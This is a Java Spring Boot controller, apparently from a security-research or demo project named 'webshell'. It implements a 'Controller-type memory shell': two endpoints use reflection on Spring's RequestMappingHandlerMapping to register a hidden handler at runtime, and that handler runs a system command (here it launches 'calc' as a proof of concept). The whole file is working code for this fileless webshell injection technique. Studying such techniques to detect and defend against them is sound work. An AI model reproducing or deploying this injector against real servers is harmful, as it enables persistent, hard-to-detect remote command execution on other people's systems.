package com.yyjccc.webshell.Controller;


import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

@RestController
public class BootShellController {
	/**
	 * 适用于 SpringMVC+Tomcat的环境，以及Springboot 2.x 环境.
	 */


	@RequestMapping("/boot")
	public String SpringControllerMemShell2() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {
		WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
		RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
		Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
		configField.setAccessible(true);
		RequestMappingInfo.BuilderConfiguration config =
				(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
		Method method2 = Shell_Controller.class.getDeclaredMethod("shellMethod");
		RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
		RequestMappingInfo info = RequestMappingInfo.paths("/bash")
				.options(config)
				.build();
		Shell_Controller shellController = new Shell_Controller();
		mappingHandlerMapping.registerMapping(info,shellController , method2);
		return "bash";
	}

	@RequestMapping("/boot2")
	public String bootShell() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
		WebApplicationContext context= RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
		RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
		Method method = Controller_Shell.class.getDeclaredMethod("shellMethod");
		//反射拿到构造RequestInfo的方法
		Method getMappingForMethod = r.getClass().getDeclaredMethod("getMappingForMethod", Method.class, Class.class);
		getMappingForMethod.setAccessible(true);
		RequestMappingInfo info = (RequestMappingInfo) getMappingForMethod.invoke(r, method, Controller_Shell.class);
		r.registerMapping(info,new Shell_Controller(),method);
		return "invoke shell";
	}

	public class Controller_Shell{
		public Controller_Shell(){}

		@RequestMapping("/myshell")
		public void shellMethod(){
			try {
				System.out.println("Controller型内存马");
				Runtime.getRuntime().exec("calc");
			} catch (IOException e) {
				throw new RuntimeException(e);
			}
		}
	}


}
